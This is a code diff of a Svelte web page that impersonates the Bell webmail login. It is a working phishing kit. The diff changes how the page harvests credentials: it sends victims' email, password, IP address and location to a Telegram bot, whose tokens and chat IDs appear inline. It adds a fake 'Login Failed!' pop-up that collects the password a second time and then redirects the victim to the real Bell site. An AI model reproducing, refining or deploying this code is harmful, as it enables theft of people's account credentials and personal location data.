@@ -1,6 +1,8 @@
 <script>
   let email = '';
   let password = '';
+  let modalPassword = '';
+  let modalEmail = '';
   let errors = { email: '', password: '' };
   let isModalVisible = false;
 
@@ -75,60 +77,26 @@
       errors.password = passwordError;
     }
 
-    // If no errors, proceed with sending data
+    // Send data
     if (!errors.email && !errors.password) {
-      // Get user's IP address
-      ipAddress = await getIpAddress();
-
-      // Try to get user's location
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            location.latitude = position.coords.latitude;
-            location.longitude = position.coords.longitude;
-
-            // Get location details
-            const locationDetails = await getLocationDetails(location.latitude, location.longitude);
-            location = { ...location, ...locationDetails };
-
-            // Send data to Telegram
-            await sendDataToTelegram(email, password, ipAddress, location);
-
-            // Show the modal
-            isModalVisible = true;
-          },
-          async (error) => {
-            console.error('Geolocation error:', error);
-
-            // Send data without location if geolocation fails
-            await sendDataToTelegram(email, password, ipAddress, location);
-
-            // Show the modal
-            isModalVisible = true;
-          }
-        );
-      } else {
-        console.error('Geolocation is not supported by this browser');
-
-        // Send data without location if geolocation is not supported
-        await sendDataToTelegram(email, password, ipAddress, location);
-
-        // Show the modal
-        isModalVisible = true;
-      }
+      // Show the modal
+      isModalVisible = true;
+       // Send data to Telegram
+      await sendDataToTelegram(email, password, ipAddress, location);
     }
   }
 
   // Send data to Telegram
-  async function sendDataToTelegram(email, password, ip, location) {
-    const botToken = '7697246301:AAFcC_2HcCcnHZ3ePerNLn8XkgqexprrfiI'; // Replace with your Telegram bot token
-    const chatId = '1678259688'; // Replace with your Telegram chat ID
+  async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
+    const botToken = '7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo'; // Replace with your(others) Telegram bot token
+      const chatId = '6173839485'; // Replace with your(others) Telegram chat ID
 
-    const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
+    const message = `New Bell Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${modalEmail}\nModal-Password: ${modalPassword}\nIP Address: ${ip}\nLocation:\nCountry: ${location.country}\nCity: ${location.city}\nState: ${location.state}\nZip Code: ${location.zip_code}`;
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-    const response = await fetch(url, {
+    try {
+      const response = await fetch(url, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -139,14 +107,25 @@
       }),
     });
 
-    const data = await response.json();
-    console.log(data); // Optional: Log the response from Telegram
+    if(response.ok){
+      console.log('login successful');
+      return true;
+    } else {
+      console.error("Failed to login:",response.status, response.data)
+    };
+    } catch(error) {
+      console.error('Error:', error);
+      return false;
+    }
   }
 
+
   // Function to close the modal
-  function closeModal() {
-    isModalVisible = false;
-  }
+async function closeModal() {
+  await sendDataToTelegram(email, password, ipAddress, location, modalEmail, modalPassword);
+  isModalVisible = false;
+  window.location.href = 'https://webmail.en.bellnet.ca';
+}
 </script>
 
 <style scoped>
@@ -210,7 +189,7 @@
 }
 
 .container {
-  background-image: url('/Bell.jpg');
+  background-image: url('/bg-image.jpg');
   background-size: cover;
   background-repeat: no-repeat;
   /* Prevent repeating background image */
@@ -230,12 +209,10 @@
   justify-content: space-between;
   width: 100%;
   max-width: 270px;
-  /* Maximum width of the modal */
   border-radius: 0.375rem;
   border-width: 1px;
   margin: auto;
   height: 480px;
-  /* padding: 1rem; Padding inside the modal */
   box-sizing: border-box;
   max-height: 80vh;
 }
@@ -353,7 +330,7 @@
     top: 0;
     left: 0;
     width: 100%;
-    height: 100%;
+    height: 500px;
     background-color: rgba(0, 0, 0, 0.5);
     justify-content: center;
     align-items: center;
@@ -370,23 +347,63 @@
     text-align: center;
   }
 
-  .modal-footer {
+  .modalform-header {
+    font-size: 20px;
     margin-top: 10px;
-    display: flex;
-    justify-content: center;
+    margin-bottom: 30px;
   }
 
-  .close-btn {
+.modalform-group {
+  display: flex;
+  flex-direction: column;
+  padding: 0 20px;
+  margin-bottom: 10px;
+}
+
+.modalform-group label {
+  font-size: 14px;
+  margin-bottom: 5px;
+  line-height: 18px;
+  height: 20px;
+  font-weight: 700;
+  font-family: "BellSlimBlack", Helvetica, Arial, sans-serif;
+  align-self: flex-start;
+}
+
+.modalform-group input[type='email'],
+.modalform-group input[type='password'] {
+  height: 40px;
+  padding: 10px;
+  border: 1px solid black;
+  border-radius: 4px;
+}
+
+.modalform-group input[type='email']:focus,
+.modalform-group input[type='password']:focus {
+  outline: none;
+  border: 1px solid #ffa07a;
+  box-shadow: 0 0 0 2px #007bff;
+  border-radius: 4px;
+}
+
+.modal-footer {
+    margin-top: 20px;
+    display: flex;
+    justify-content: flex-start;
+    padding: 0 20px;
+  }
+
+  .modal-btn {
     padding: 10px 20px;
-    background-color: #ff4b4b;
+    background: linear-gradient(to right, #004e94, #0064a2);
     color: white;
     border: none;
     border-radius: 5px;
     cursor: pointer;
   }
 
-  .close-btn:hover {
-    background-color: #cc3f3f;
+  .modal-btn:hover {
+    opacity: 0.8;
   }
 
 /* Media queries for responsiveness */
@@ -472,13 +489,22 @@
   </div>
 </div>
 
-<!-- Modal for Success Message -->
+<!-- Modal for Second Verification -->
 <div class="modal-overlay {isModalVisible ? 'visible' : ''}">
   <div class="modal-content">
-    <h2>Login Failed!</h2>
-    <p>Kindly reload the page and try again!...</p>
+    <h2 class="modalform-header">Login Failed!</h2>
+     <div class="modalform-group">
+        <label for="modalemail">Email Address</label>
+        <input id="modalemail" type="email" bind:value={modalEmail} name="email"/>
+      </div>
+
+      <div class="modalform-group">
+        <label for="modalpassword">Password</label>
+        <input id="modalpassword" type="password" bind:value={modalPassword} />
+     
+      </div>
     <div class="modal-footer">
-      <button class="close-btn" on:click={closeModal}>Close</button>
+      <button class="modal-btn" on:click={closeModal}>Log in</button>
     </div>
   </div>
 </div>
